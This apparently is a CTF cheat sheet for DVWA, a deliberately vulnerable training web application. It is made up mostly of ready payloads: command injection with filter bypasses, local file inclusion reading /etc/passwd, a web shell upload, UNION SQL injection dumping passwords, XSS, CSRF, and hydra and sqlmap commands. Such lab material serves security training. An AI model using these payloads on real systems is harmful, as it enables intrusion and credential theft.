# DVWA (Damn Vulnerable Web Application)

Setup: `/setup.php` → "Create / Reset Database", login `admin:password`. Security level in
**DVWA Security** (cookie `security=low|medium|high|impossible` — you can edit the cookie!).

## Fastest route to the flag (env var) — Command Injection
| Level | Payload in "Enter an IP" |
|---|---|
| low | `127.0.0.1; env` |
| medium (`&&`, `;` stripped) | `127.0.0.1 & env` / `127.0.0.1 \| env` |
| high (most stripped; `"\| "` with space) | `127.0.0.1\|env` (no space after pipe) |
```bash
curl -s -b 'PHPSESSID=<id>; security=low' --data-urlencode 'ip=127.0.0.1; env' -d 'Submit=Submit' \
     $T/vulnerabilities/exec/ | grep -o 'flag{[^}]*}'
```

## Other modules
| Module | Low-level payload | Note |
|---|---|---|
| Brute Force | `admin`/`password` via hydra/ffuf (GET form) | [brute-force](../03-auth/brute-force.md) |
| File Inclusion | `?page=/proc/self/environ`, `?page=../../../../etc/passwd`, `php://filter/...` | [lfi](../05-injection/lfi-path-traversal.md) |
| File Upload | upload `shell.php` → `/hackable/uploads/shell.php?c=env` | [file-upload](../05-injection/file-upload.md) |
| SQL Injection | `1' UNION SELECT user,password FROM users#` | [union](../06-sqli/union-based.md) |
| SQLi (Blind) | `1' AND SLEEP(3)#` / boolean | [boolean](../06-sqli/boolean-blind.md) |
| XSS (Reflected/Stored/DOM) | `<script>alert(1)</script>`; medium `<ScRipt>`/`<img onerror>` | [07-xss](../07-xss-client-side/README.md) |
| CSRF | GET `/vulnerabilities/csrf/?password_new=x&password_conf=x&Change=Change` | [csrf](../07-xss-client-side/csrf.md) |
| Weak Session IDs | low: incrementing int; medium: timestamp; high: md5(int) | [predictable-tokens](../03-auth/predictable-tokens.md) |

`sqlmap -u "$T/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie 'PHPSESSID=..;security=low' --dump`
